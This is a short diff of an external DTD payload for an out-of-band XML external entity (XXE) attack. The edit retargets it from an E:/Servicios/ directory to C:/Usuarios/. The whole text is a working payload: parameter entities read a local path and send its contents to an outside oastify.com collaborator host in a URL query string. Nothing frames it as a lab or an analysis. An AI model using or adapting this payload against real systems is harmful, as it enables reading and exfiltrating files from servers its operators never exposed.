@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///E:/Servicios/">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3y2bk6tc1744miappfuk6i4e45a0yqmf.oastify.com/?e_root_list=%file;'>">
+<!ENTITY % file SYSTEM "file:///C:/Usuarios/">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3y2bk6tc1744miappfuk6i4e45a0yqmf.oastify.com/?usuarios=%file;'>">
 %eval;
 %exfil;
